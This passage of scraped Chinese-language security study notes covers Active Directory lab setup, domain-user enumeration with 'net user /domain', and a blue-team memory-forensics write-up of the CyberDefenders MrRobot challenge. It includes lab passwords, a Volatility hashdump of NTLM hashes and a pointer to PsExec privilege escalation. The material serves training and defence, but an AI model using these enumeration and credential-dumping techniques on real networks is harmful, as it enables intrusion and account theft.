Service)，簡單來說就是平常我們可以用Google或Facebook的帳號登入其他的網站或應用程式，而不用一定要重新註冊一組專屬於該網頁的帳號，這也代表該網站或應用程式它會信任google/facebook的用戶認證系統，實作上就可以不用實作這一塊，取而代之的是調用第三方身分驗證系統的機構達到同樣的效果，而AAD就是IdaaS的其中一種體現方式\nAD AAD 協定 KerberosNTLMLDAP SAMLOAuth2OIDCWS-Fed How to use cloud APP? ADFS認證 IdaaS 特別的功能 無 Multi-Factor Authentication條件訪問Identity Protection IR從零開始的自我修煉之路-Day 02 # What is IR(incident response)?\nIncident Response 事件響應（事件管理）是企業或組織管理資安事件的處理方法。機敏資訊外洩或遭到攻擊破壞系統，且影響到客戶（遭詐騙、騷擾等）、知識產權、營業秘密、品牌價值等。IR用意是在為了減少企業損害並進快復原且避免再次發生同樣狀況。做調查就是為了從攻擊中吸取教訓並改善資安防護措施，由於當今有許多公司都會遇到類似的問題，因此制定完善且有明確的ＳＯＰ事件回報計畫是保護公司的不錯方式。\n會後提及有用的工具 # Ping Castle # 這個工具可以幫AD環境做快速的稽核，然後會產生報表，讓使用者可以一目了然目前AD的狀況\nWAZUH # 這個工具就是前面講到的XDR，可以幫用戶做弱掃、路徑偵測、安全分析之類的\nWazuh provides analysts real-time correlation and context. Active responses are granular, encompassing on-device remediation so endpoints are kept clean and operational.\nPsExec # psexec是windows下非常好的一款遠程命令行工具。psexec的使用不需要對方主機開機3389端口，只需要對方開啟admin共享或c(該共享默認開啟，依賴於445端口)。但是，假如目標主機開啟了防火墻(因為防火墻默認禁止445端口的連接)，psexec也是不能使用的，會提示找不到網絡路徑。由於psexec是windows提供的工具，所以殺毒軟件會將其添加到白名單中。 - by 5\n詳細的提權教學可以看這邊6\nSIEM廠商 # splunk ArcSight - 詳細可以看TaiwanHolyHigh - SoC基礎維運\nReference # VNC教學 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nvnc遠端桌面圖像界面 安裝與使用 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nVNC與RDP區別\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n比較 Active Directory 與 Azure Active Directory\u0026#160;\u0026#x21a9;\u0026#xfe0e;\npsexec工具的使用\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n利用PsExec提權為system管理員教學(windows提權)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":229,"href":"/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/","title":"NTUSTISC - AD Note - 環境建置 \u0026 Background","section":"Securities","content":" NTUSTISC - AD Note - 環境建置 \u0026amp; Background # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # What is Directory Service?1\nWindows Server 系統使用的目錄服務 就是 Active Directory\nWhat is Active Directory(AD)?2\nWindows的Windows Server中，負責架構中大型網路環境的集中式目錄管理服務(Directory Services)，他處理在組織中的網路物件，物件可以是使用者、群組、電腦、網域控制站、郵件、設定檔、組織單元、樹系等等，只要是在AD結構定義檔(Schema)中定義的物件，就可以儲存在AD資料檔中，並利用AD Service Interface來存取\nWhat is Domain Service?1\n執行 AD DS 的伺服器稱為 domain controllers (DCs)\nWhat is LDAP?3 :::info\n輕量型目錄存取協定 (LDAP) 是用來從 Active Directory 讀取資料，及將資料寫入 Active Directory 的標準協定。某些應用程式使用 LDAP 新增、移除或搜尋 Active Directory 中的使用者和群組，或是傳輸登入資料來驗證 Active Directory 中的使用者。每個 LDAP 通訊都包括用戶端 (如應用程式) 和伺服器 (例如 Active Directory)。 :::\nWhat is Organization Units(OU)?[^fei-organization-units]\n容區(Container)：屬性集合，跟物件不同是容器可以包含多個「物件」 組織單位(Organization Units)：特殊容區，可包含其他物件、組織單位、群組原則\nWhat is Group Policy Object(GPO)?4\n群組原則是透過群組原則物件(Group Policy Object,GPO)來設定，你要只要將GPO連結到指定的網域，此GPO內的設定值就會影響到該網域內的所有使用者與電腦。\n內建GPO # AD DS網域有兩個內建的GPO\nDefault Domain Policy:此GPO預設已備連結到網域，因此其設定值會套用到整個網域內的所有使用者與電腦。 Default Domain Controller Policy:此GPO預設已被連到組織單位Domain Controllers，因此其設定值會被套用到Domain Controllers內所有的使用者與電腦 (Domain Controllers 內預設只有網域控制站的電腦帳戶。) 環境建置 # :::info 這一整個lab雖然是從講師的drive下載下來的(連結爛掉了，有需要可以跟我拿)，但還是可以從網路中自己創一個有這麼多漏洞的lab環境。可以先安裝win2016的虛擬機，然後到WazeHell/vulnerable-AD下載script，在該環境中跑起來，就可以了，不果因為跑完之後的所有帳號或密碼都是隨機的，所以如果要看別人或是後續我寫的WP會有點困難 :::\n實驗環境拓樸 # 帳號密碼 # Win10(Client) 帳號：administrator 密碼：1qaz@WSX3edc 一般的網域帳號 帳號：bear 密碼：1qaz@WSX3edc 低權限帳號 帳號：low 密碼：\u0026lt;無\u0026gt; Win2016(DC) 帳號：administrator 密碼：1qaz@WSX3edc ==Note== :::info 如果要指定本機端的帳戶進行登入，可以在帳號前面加入.\\的符號或是直接寫主機名稱，強制用本地端的帳號登入，這個帳戶就是沒有加入AD domain底下 ::: 詳細步驟 # 把講師提供的兩支VM(win10/win2016)灌起來並自行下載kali2022，==建議用VMware==\n啟用Neo4j \u0026amp; BloodHound 因為環境目前預設的JDK version是1.8，所以如果啟用後續會用到的Neo4j會出問題，所以我們要先改java版本，改成JDK-11，比較詳細的流程可以參考5\nUninstall JDK-1.8 Download JDK-11 \u0026amp; Install it(Link) 下載之前會需要你登入Oracle帳號 如果想要知道哪一個版本的JAVA對應到哪一個版本的Neo4j，可以從這邊6找，照法就是在網址的地方中間有一個neo4j的版本，打上你的neo4j版本，他就會到對應的頁面告訴你JAVA的版本應該是多少，例如我的版本是4.3，就打上https://neo4j.com/docs/operations-manual/4.3/installation/requirements/，不過他也只有分3.x和4.x Modify Environment Variable 更改環境變數這件事情一定要在Win10加入AD之前做的原因是，只要加入AD就無法改變環境變數的系統變數(如下圖)，那我有想過把Win10直接退掉AD的網域，不過過程困難重重，所以我想還是直接開一個新的Win10從頭來會比要快，而且加入AD後還不能連網，畢竟DNS都被改掉了，會很不方便 首先要在系統變數的地方新增JAVA_HOME然後value就是當初安裝JDK-11的位置 並在Path中新增%JAVA_HOME%\\bin和\u0026lt;JDK-11 path to bin\u0026gt;並按下確定後到Command Prompt確認有沒有成功 Activate Neo4j 在neo4j的目錄中進到bin，然後打開cmd，輸入$ neo4j.bat console，理論上前面有做對，應該就會開啟Neo4j的服務 :::spoiler Activate Neo4j Log C:\\tools\\neo4j-community-4.3.4\\bin\u0026gt;neo4j.bat console Directories in use: home: C:\\tools\\neo4j-community-4.3.4 config: C:\\tools\\neo4j-community-4.3.4\\conf logs: C:\\tools\\neo4j-community-4.3.4\\logs plugins: C:\\tools\\neo4j-community-4.3.4\\plugins import: C:\\tools\\neo4j-community-4.3.4\\import data: C:\\tools\\neo4j-community-4.3.4\\data certificates: C:\\tools\\neo4j-community-4.3.4\\certificates licenses: C:\\tools\\neo4j-community-4.3.4\\licenses run: C:\\tools\\neo4j-community-4.3.4\\run Starting Neo4j. 2023-08-27 03:48:08.068+0000 INFO Starting... 2023-08-27 03:48:10.649+0000 INFO ======== Neo4j 4.3.4 ======== 2023-08-27 03:48:12.832+0000 INFO Initializing system graph model for component \u0026#39;security-users\u0026#39; with version -1 and status UNINITIALIZED 2023-08-27 03:48:12.848+0000 INFO Setting up initial user from defaults: neo4j 2023-08-27 03:48:12.848+0000 INFO Creating new user \u0026#39;neo4j\u0026#39; (passwordChangeRequired=true, suspended=false) 2023-08-27 03:48:12.870+0000 INFO Setting version for \u0026#39;security-users\u0026#39; to 3 2023-08-27 03:48:12.870+0000 INFO After initialization of system graph model component \u0026#39;security-users\u0026#39; have version 3 and status CURRENT 2023-08-27 03:48:12.870+0000 INFO Performing postInitialization step for component \u0026#39;security-users\u0026#39; with version 3 and status CURRENT 2023-08-27 03:48:13.274+0000 INFO Bolt enabled on 127.0.0.1:7687. 2023-08-27 03:48:14.472+0000 INFO Remote interface available at http://localhost:7474/ 2023-08-27 03:48:14.472+0000 INFO Started. 2023-08-27 03:51:44.289+0000 WARN The client is unauthorized due to authentication failure. ::: 接著進到http://localhost:7474/，輸入預設帳密neo4j/neo4j，最後改密碼就好了 Activate BloodHound 進到BloodHound/bin目錄然後執行BloodHound.exe輸入neo4j的帳密，就可以進到一個全新的bloodhound頁面 把Win10加入AD\nCheck Win2016 IP - 192.168.183.129 將Win10的DNS指向AD 主要目的就是把Win10網卡的DNS指向前面找到的Domain，在設定/網路和網際網路/狀態/變更介面卡選項/乙太網路/內容/網際網路通訊協定第4版(TCP/IPV4)/內容就可以找到更改的地方，然後把Win2016的IP填入 更改Win10網域 從控制台/系統及安全性/系統/變更設定/變更中更改網域成kuma.org，填入帳密按確定就可以了 Restart Win10 使用網域帳號登入 用bear這個帳號登入Win10 :::spoiler Result 可以看到系統資訊中，網域的部分已經變成kuma.org ::: Reference # AD Security - [Day2] 一起來學 AD 安全吧！：什麼是 AD(1) \u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nActive Directory\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n啟用安全 LDAP (LDAPS) [^fei-organization-units]AD Security - [Day5] 一起來學 AD 安全吧！：什麼是 AD(3) Container \u0026amp; OU \u0026amp; Security Group \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nGPO概念\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n當安裝Neo4j後，在cmd中輸入neo4j遇到(ERROR!Neo4j cannot be started using java version 1.8.0_211\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSystem requirements \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":230,"href":"/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/","title":"NTUSTISC - AD Note(Lab - 查詢網域使用者)","section":"Securities","content":" NTUSTISC - AD Note(Lab - 查詢網域使用者) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nLab Time - 環境調查 # ==查詢網域使用者== # 常用的cheat sheet\n$ net user /domain $ net user \u0026lt;username\u0026gt; /domain :::spoiler Implementation\n$ net user /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 \\\\WIN-818G5VCOLJO.kuma.org 的使用者帳戶 ------------------------------------------------------------------------------- Administrator aleda.appolonia alikee.perri aloise.elfrida amabelle.gayle andree.suki angelique.hilda annice.eden anya.gypsy audi.rosalind babb.joanne bambi.etta bear berget.celka berna.raphaela berny.kirby bill.marylee caitrin.latia carey.kincaid carlye.chloette carmelle.libbi casandra.cherrita casi.hyacinth cassondra.lothario celeste.kelci charis.kory christi.nettle coraline.mahalia corine.celesta cyndie.rhodie daile.odetta darlleen.dorisa DefaultAccount dollie.fayina dominica.carmon dorrie.paolina eba.luca ella.randee erena.elinore fara.iseabal fred.carmita gabriel.diannne garnet.constancia gertrude.felecia gillian.marsiella giulietta.moyra glenda.dorrie Guest henrieta.sabine herminia.debby issy.eudora jerrie.morganne jessa.corinna jori.floria joyann.sibella kaja.brenda karoly.nadeen katee.annemarie katharina.alyssa kiri.kath kizzee.margaux krbtgt laurena.mirelle lazaro.karoly lilas.lindy lily.kristofor lina.allene linda.neda logan.janeen lon.sonni lorne.celie lucilia.lelah margo.sharl marlyn.loralee marney.ranee martita.juanita marylynne.susannah maurizia.ines mercy.edi moyra.fanechka nolana.rivy ollie.dorita orelee.peri ortensia.fancy philippa.eugenie philis.gilli pietra.fern randene.lelah ranee.delinda reina.claire renae.babette reyna.gwendolyn ricca.stefa ronni.kristoforo rosetta.lotta ruthann.britta ruthie.ebony seana.jeanette selestina.cassi shantee.marylin sherri.jacquetta sile.rhiamon sofie.darlleen star.rikki stormie.natala 命令已經成功完成。 ::: 說明：如果目前登入的帳號是在domain底下，就會出現類似如上的結果，會有一大堆使用者，但是目前的帳號沒有在該domain底下，會出現以下error:\n$ C:\\User\\low\u0026gt;net user /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 系統發生 5 錯誤。 存取被拒。 "},{"id":231,"href":"/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/","title":"NTUSTISC - CyberDefender - MrRobot - Target 1","section":"Securities","content":" NTUSTISC - CyberDefender - MrRobot - Target 1 # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/88 Target 2: https://hackmd.io/@SBK6401/HJz2FPne6 POS: https://hackmd.io/@SBK6401/BJpJqDhlp\n:::spoiler TOC [TOC] ::: Lecture Video: 2022/06/29 藍隊安全系列課程 04 Volatility - Cheat Sheet\nBackground # vmss2core 題目下載之後會得到一些.vmss的檔案，這時候就需要下載vmss2core.exe，.vmss是VMware經過轉換的snapshot，而這個工具可以把snapshot轉換成memory dump :::spoiler Execution Result $ vmss2core-sb-8456865.exe -W .\\c69-Grrcon2015\\pos01\\POS-01-c4e8f786.vmss vmss2core version 8456865 Copyright (C) 1998-2017 VMware, Inc. All rights reserved. ... 10 MBs written. ... 20 MBs written. ... 30 MBs written. ... ... 1020 MBs written. Finished writing core. ::: Volatility3: 安裝可以直接參考影片，建議直接使用windows exe protable file，這樣比較方便也穩定，而且還不需要擔心環境的問題 Lab - Target 1 # 起手式 # $ python vol.py -f memory.dmp imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS) AS Layer3 : FileAddressSpace (D:\\Downloads\\Trash\\CyberDefenders\\c69-Grrcon2015\\target1\\memory.dmp) PAE type : PAE DTB : 0x3ecc3260L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2015-10-09 12:53:02 UTC+0000 Image local date and time : 2015-10-09 08:53:02 -0400 重要資訊System Name: Win7SP0x86\n==Q1== # What email address tricked the front desk employee into installing a security update?\nRecon # 既然要找到email，可以有兩種思路，一種是直接看哪些檔案帶有email中常見的string，例如From之類的；另外一種思路是，查看之前執行過的process中有甚麼是和email有關係的，本題以思路1當作主要方式:\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 yarascan -Y \u0026#34;From:\u0026#34; Volatility Foundation Volatility Framework 2.6 Rule: r1 Owner: Process OUTLOOK.EXE Pid 3196 0x086dffe1 46 72 6f 6d 3a 20 54 68 65 20 57 68 69 74 33 52 From:.The.Whit3R 0x086dfff1 30 73 33 20 3c 74 68 33 77 68 31 74 33 72 30 73 0s3.\u0026lt;th3wh1t3r0s 0x086e0001 33 40 67 6d 61 69 6c 2e 63 6f 6d 3e 0d 0a 54 6f 3@gmail.com\u0026gt;..To 0x086e0011 3a 20 3c 66 72 6f 6e 74 64 65 73 6b 40 61 6c 6c :.\u0026lt;frontdesk@all 0x086e0021 73 61 66 65 63 79 62 65 72 73 65 63 2e 63 6f 6d safecybersec.com 0x086e0031 3e 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a \u0026gt;..Content-Type: 0x086e0041 20 6d 75 6c 74 69 70 61 72 74 2f 61 6c 74 65 72 .multipart/alter 0x086e0051 6e 61 74 69 76 65 3b 20 62 6f 75 6e 64 61 72 79 native;.boundary 0x086e0061 3d 22 30 30 31 61 31 31 33 34 33 32 37 38 62 64 =\u0026#34;001a11343278bd 0x086e0071 61 30 64 36 30 35 32 31 61 36 31 65 39 35 22 0d a0d60521a61e95\u0026#34;. 0x086e0081 0a 52 65 74 75 72 6e 2d 50 61 74 68 3a 20 74 68 .Return-Path:.th 0x086e0091 33 77 68 31 74 33 72 30 73 33 40 67 6d 61 69 6c 3wh1t3r0s3@gmail 0x086e00a1 2e 63 6f 6d 0d 0a 58 2d 4d 53 2d 45 78 63 68 61 .com..X-MS-Excha 0x086e00b1 6e 67 65 2d 4f 72 67 61 6e 69 7a 61 74 69 6f 6e nge-Organization 0x086e00c1 2d 4e 65 74 77 6f 72 6b 2d 4d 65 73 73 61 67 65 -Network-Message 0x086e00d1 2d 49 64 3a 20 34 35 35 36 64 33 61 34 2d 33 38 -Id:.4556d3a4-38 :::spoiler Flag Flag: th3wh1t3r0s3@gmail.com :::\n==Q2== # What is the filename that was delivered in the email?\nRecon # 這一題一樣是要找和email相關的文件，有提示是一個執行檔，所以主要想法應該是把剛剛的process執行過程中的memory dump下來，再去分析他，試圖string search有沒有.exe的部分\nExploit # 先查詢當時執行那些process Command: python vol.py -f ..\\memory.dmp --profile Win7SP0x86 pslist :::spoiler Command Result $ python vol.py -f ..\\memory.dmp --profile Win7SP0x86 pslist Volatility Foundation Volatility Framework 2.6.1 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x83d334e8 System 4 0 94 500 ------ 0 2015-10-09 11:30:44 UTC+0000 0x84edcbf0 smss.exe 276 4 2 30 ------ 0 2015-10-09 11:30:44 UTC+0000 0x84ecbb18 csrss.exe 368 360 9 366 0 0 2015-10-09 11:30:47 UTC+0000 0x84f97628 wininit.exe 420 360 3 77 0 0 2015-10-09 11:30:48 UTC+0000 0x855f6d40 csrss.exe 432 412 11 366 1 0 2015-10-09 11:30:48 UTC+0000 0x8561d030 winlogon.exe 480 412 3 115 1 0 2015-10-09 11:30:48 UTC+0000 0x84e979f8 services.exe 528 420 9 200 0 0 2015-10-09 11:30:48 UTC+0000 0x8583b030 lsass.exe 536 420 9 851 0 0 2015-10-09 11:30:48 UTC+0000 0x8583d960 lsm.exe 544 420 10 163 0 0 2015-10-09 11:30:48 UTC+0000 0x8586fd40 svchost.exe 644 528 11 351 0 0 2015-10-09 11:30:48 UTC+0000 0x84e01448 svchost.exe 720 528 6 276 0 0 2015-10-09 11:30:50 UTC+0000 0x85935030 svchost.exe 796 528 19 446 0 0 2015-10-09 11:30:51 UTC+0000 0x85969030 svchost.exe 836 528 17 405 0 0 2015-10-09 11:30:52 UTC+0000 0x85978940 svchost.exe 864 528 30 1036 0 0 2015-10-09 11:30:52 UTC+0000 0x859cc2c0 svchost.exe 1008 528 13 650 0 0 2015-10-09 11:30:52 UTC+0000 0x85a138f0 svchost.exe 1124 528 16 484 0 0 2015-10-09 11:30:53 UTC+0000 0x8582c8d8 spoolsv.exe 1228 528 12 273 0 0 2015-10-09 11:30:53 UTC+0000 0x85a55d40 svchost.exe 1256 528 17 304 0 0 2015-10-09 11:30:53 UTC+0000 0x85ae3030 vmtoolsd.exe 1432 528 8 274 0 0 2015-10-09 11:30:54 UTC+0000 0x85976318 svchost.exe 1784 528 5 99 0 0 2015-10-09 11:30:54 UTC+0000 0x85ae0cb0 dllhost.exe 1888 528 13 196 0 0 2015-10-09 11:30:54 UTC+0000 0x858b69e8 msdtc.exe 1980 528 12 145 0 0 2015-10-09 11:30:55 UTC+0000 0x85c09968 dwm.exe 2088 836 3 93 1 0 2015-10-09 11:31:04 UTC+0000 0x85c1e5f8 explorer.exe 2116 2060 23 912 1 0 2015-10-09 11:31:04 UTC+0000 0x85c39030 taskhost.exe 2252 528 7 150 1 0 2015-10-09 11:31:04 UTC+0000 0x859281f0 vmtoolsd.exe 2388 2116 7 164 1 0 2015-10-09 11:31:04 UTC+0000 0x8598c920 SearchIndexer. 2544 528 13 670 0 0 2015-10-09 11:31:10 UTC+0000 0x85d0d030 iexplore.exe 2996 2984 6 463 1 0 2015-10-09 11:31:27 UTC+0000 0x85cd3d40 OUTLOOK.EXE 3196 2116 22 1678 1 0 2015-10-09 11:31:32 UTC+0000 0x85d01510 svchost.exe 3232 528 9 131 0 0 2015-10-09 11:31:34 UTC+0000 0x85b43a58 sppsvc.exe 3900 528 4 153 0 0 2015-10-09 11:32:54 UTC+0000 0x83eb5d40 cmd.exe 2496 2116 1 22 1 0 2015-10-09 11:33:42 UTC+0000 0x83e5cd40 conhost.exe 916 432 3 83 1 0 2015-10-09 11:33:42 UTC+0000 0x83f105f0 cmd.exe 1856 2996 1 33 1 0 2015-10-09 11:35:15 UTC+0000 0x83f13d40 conhost.exe 1624 432 3 81 1 0 2015-10-09 11:35:15 UTC+0000 0x83fb86a8 cmd.exe 3064 2116 1 22 1 0 2015-10-09 11:37:32 UTC+0000 0x83fa9030 conhost.exe 676 432 3 83 1 0 2015-10-09 11:37:32 UTC+0000 0x83fb2d40 cmd.exe 3784 2196 1 24 1 0 2015-10-09 11:39:22 UTC+0000 0x83fc7c08 conhost.exe 1824 432 3 85 1 0 2015-10-09 11:39:22 UTC+0000 0x84013598 TeamViewer.exe 2680 1696 28 632 1 0 2015-10-09 12:08:46 UTC+0000 0x84017d40 tv_w32.exe 4064 2680 2 83 1 0 2015-10-09 12:08:47 UTC+0000 0x858bc278 TeamViewer_Des 1092 2680 16 405 1 0 2015-10-09 12:10:56 UTC+0000 0x83f1ed40 mstsc.exe 2844 2116 11 484 1 0 2015-10-09 12:12:03 UTC+0000 ::: 重要資訊: OUTLOOK.EXE -\u0026gt; PID -\u0026gt; ==3196== 把執行OUTLOOK.EXE時候的memory dump下來 $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 memdump -p 3196 --dump-dir .\\output\\proc_dump_pid3196 Volatility Foundation Volatility Framework 2.6 ************************************************************************ Writing OUTLOOK.EXE [ 3196] to 3196.dmp String Search .exe $ strings 3196.dmp | grep \u0026#34;\\.exe\u0026#34; \u0026gt; output.txt 經過不斷的嘗試最後找到AnyConnectInstaller.exe為最終答案 :::spoiler Flag Flag: AnyConnectInstaller.exe :::\n==Q3== # What is the name of the rat\u0026rsquo;s family used by the attacker?\nBackground # 深度調研：真實世界里的大規模RAT家族 遠程控制木馬(Remote Access Trojans，簡稱為 RAT)是一種主流的惡意程序，它賦予了攻擊者遠程監控和控制受害者主機的能力\nRecon # 這一題是要找出RAT家族程式的名字，所以從上一題可以知道受害電腦從email下載了一個程式(AnyConnect.exe)，所以如果要知道他是RAT家族的甚麼名字，可以透過hash直接上網查找或是直接用virustotal比對database，但反正第一步一定是要先取得這隻程式的樣本\nExploit # 找出文件中含有AnyConnect的字樣 $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 filescan | findstr \u0026#34;AnyConnect\u0026#34; Volatility Foundation Volatility Framework 2.6 0x000000003df12dd0 2 0 RW-rwd \\Device\\HarddiskVolume2\\Users\\anyconnect\\AnyConnect\\AnyConnectInstaller.exe 0x000000003df1cf00 4 0 R--r-d \\Device\\HarddiskVolume2\\Users\\anyconnect\\AnyConnect\\AnyConnectInstaller.exe 0x000000003e0bc5e0 7 0 R--r-d \\Device\\HarddiskVolume2\\Users\\frontdesk\\Downloads\\AnyConnectInstaller.exe 0x000000003e2559b0 8 0 R--rwd \\Device\\HarddiskVolume2\\Users\\frontdesk\\Downloads\\AnyConnectInstaller.exe 0x000000003e2ae8e0 8 0 RWD--- \\Device\\HarddiskVolume2\\Users\\anyconnect\\AnyConnect\\AnyConnectInstaller.exe 0x000000003ed57968 4 0 R--r-d \\Device\\HarddiskVolume2\\Users\\frontdesk\\Downloads\\AnyConnectInstaller.exe 把該文件dump出來 $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 dumpfiles -n -D .\\output\\dumpfiles -Q 0x000000003e0bc5e0 Volatility Foundation Volatility Framework 2.6 ImageSectionObject 0x3e0bc5e0 None \\Device\\HarddiskVolume2\\Users\\frontdesk\\Downloads\\AnyConnectInstaller.exe DataSectionObject 0x3e0bc5e0 None \\Device\\HarddiskVolume2\\Users\\frontdesk\\Downloads\\AnyConnectInstaller.exe :::info -n: 代表包含文件原始名稱 -Q: 代表physical offset -D: 代表dump出來要放的位址 ::: 放到VirusTotal上查詢 詳細的審查結果可以看這邊 :::spoiler Flag Flag: XtremeRat :::\n==Q4== # The malware appears to be leveraging process injection. What is the PID of the process that is injected?\nRecon # 這一題延伸了第二題的process list，因為process injection的操作，代表目前的process一定會出現在pslist，然後我是用暴力try try看，畢竟提示是四個digits，扣掉一些常見的windows process，應該沒剩多少\n$ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ ... 0x85d0d030 iexplore.exe 2996 2984 6 463 1 0 2015-10-09 11:31:27 UTC+0000 ... :::spoiler Flag Flag: 2996 $\\to$ iexplore.exe :::\n==Q5== # What is the unique value the malware is using to maintain persistence after reboot?\nBackground # 註冊表中的運行鍵是什麼？ Recon # 我們都知道惡意程式會在機碼設定重開機後自動執行，例如在: 電腦\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 電腦\\HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 所以如果要看會不會重開機後自動執行，就直接看機碼\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 printkey -K \u0026#34;Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; Volatility Foundation Volatility Framework 2.6 Legend: (S) = Stable (V) = Volatile ---------------------------- Registry: \\SystemRoot\\System32\\Config\\SOFTWARE Key name: Run (S) Last updated: 2015-10-09 10:36:11 UTC+0000 Subkeys: Values: REG_SZ VMware User Process : (S) \u0026#34;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\u0026#34; -n vmusr REG_EXPAND_SZ MrRobot : (S) c:\\users\\anyconnect\\AnyConnect\\AnyConnectInstaller.exe :::info printkey: 印出機碼路徑/子路徑/內容 -K: 機碼的路徑 :::\n:::spoiler Flag Flag: MrRobot :::\n==Q6== # Malware often uses a unique value or name to ensure that only one copy runs on the system. What is the unique name the malware is using?\nBackground # Windows HANDLE是什麼 這一篇講的出奇的好，他用程式設計的角度解釋為甚麼我們需要使用handle，若不使用的話會在甚麼情況出現問題等等，所以我對handle的理解是它就像一個pointer一樣，可以指向一個結構、process或是資源，而不同的結構創造出的handle不能通用，原因的話，文章中有提到，總而言之各個process產生的時候都需要各種不同的資源，例如螢幕、記憶體、鍵盤等等資源，而這些資源要怎麼只在這個process中被使用呢?答案就是利用handle，他可以只在該Process中指向該process所需要的資源，而不會和其他process搞混，如果再更進階一點可以看這一篇: 什麼是句柄？爲什麼會有句柄？HANDLE Handle本身是一個32位的無符號整數，它用來代表一個內核對象。它並不指向實際的內核對象，用戶模式下的程序永遠不可能獲得一個內核對象的實際地址（一般情況下）。那麼Handle的意義何在？它實際上是作爲一個索引在一個表中查找對應的內核對象的實際地址。那麼這個表在哪裏呢？每個進程都有這樣的一個表，叫句柄表。該表的第一項就是進程自己的句柄，這也是爲什麼你調用GetCurrentProcess()總是返回0x7FFFFFFF原因。 簡單地說，Handle就是一種用來\u0026quot;間接\u0026quot;代表一個內核對象的整數值。你可以在程序中使用handle來代表你想要操作的內核對象。這裏的內核對象包括：事件（Event）、線程、進程、Mutex等等。我們最常見的就是文件句柄（file handle）\n如何打開.dat 文件 DAT 文件是一個數據文件，其中包含有關用於創建它的程序的特定信息。\nRecon # 回到目前的題目，雖然沒有提到handle等字眼，但我們可以推測其實每一個process在建立的時候都會有一個特殊的handle table，而且該table是for該process唯一的，則我們就可以往handle的方向去想，再搭配前面找到的PID，就可以幫助我們找到答案。\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 handles -p 2996 | findstr \u0026#34;.dat\u0026#34; Volatility Foundation Volatility Framework 2.6 0x85d11700 2996 0x150 0x1f0001 Mutant fsociety0.dat 根據主要參考WP1的說法\nMalware typically uses a mutant/mutex to run a single copy of malware on the system and to avoid reinfecting the host, which can increase the chances of detection by security tools.\n而根據MSDN-HANDLE中的說明，mutant是handle的其中一種類型，他還有其他的，例如event, file, port, directory之類的 :::spoiler Flag Flag: fsociety0.dat :::\n==Q7== # It appears that a notorious hacker compromised this box before our current attackers. Name the movie he or she is from.\nRecon # 這一題的重點在於我要找到一個名字，所以直覺會想說從username開始找，所以一樣從\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 filescan | findstr User \u0026gt; .\\output\\filescan\\findstr_User.txt 然後就利用一些文字編輯器，找名字，應該沒有很多，所以可以找到一些名字，大部分是frontdesk, FRONTD~1, Administrator等等，但應該可以找到gideon和zerocool的名字，前者應該是原使用者的名字，而後者應該是駭客的名字，上網搜尋一下發現zerocool是《Hackers》(1995年上映的電影)中出現的駭客名字\n:::spoiler Flag Flag: Hackers :::\n==Q8== # What is the NTLM password hash for the administrator account?\nBackground # NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)\nRecon # 既然是要找NTLM hash，可以使用hashdump這個Plugin\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 hashdump Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:79402b7671c317877b8b954b3311fa82::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: front-desk:1000:aad3b435b51404eeaad3b435b51404ee:2ae4c526659523d58350e4d70107fc11::: :::spoiler Flag Flag: 79402b7671c317877b8b954b3311fa82 :::\n==Q9== # The attackers appear to have moved over some tools to the compromised front desk host. How many tools did the attacker move?\nRecon # 